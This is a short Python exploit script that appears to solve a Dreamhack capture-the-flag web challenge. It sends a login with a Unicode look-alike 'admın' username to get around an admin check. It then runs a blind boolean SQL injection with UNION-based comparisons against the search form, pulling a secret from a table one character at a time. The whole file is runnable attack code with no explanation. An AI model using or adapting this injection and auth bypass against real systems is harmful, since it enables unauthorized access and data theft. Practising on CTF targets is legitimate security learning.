import requests
import string
URL = "http://host8.dreamhack.games:21232/"
session = requests.Session()
def admin():
    d = {
        'username': 'admın' # unicode
    }
    r = session.post(URL + 'login', data=d)

def sqli():
    flag = ""
    for i in range(30):
        found = False
        for j in range(128, 31, -1):
            d = {
                'name': f"orange' and (select * from secretgyul union select 1,'{flag + chr(j)}',1 limit 1) = (select 1,'{flag + chr(j)}',1) -- "
            }
            r = session.post(URL + 'search', data=d)
            if ('true' in r.text):
                flag += chr(j)
                found = True
                print(flag)
                break
        if (found == False):
            break

admin()
sqli()
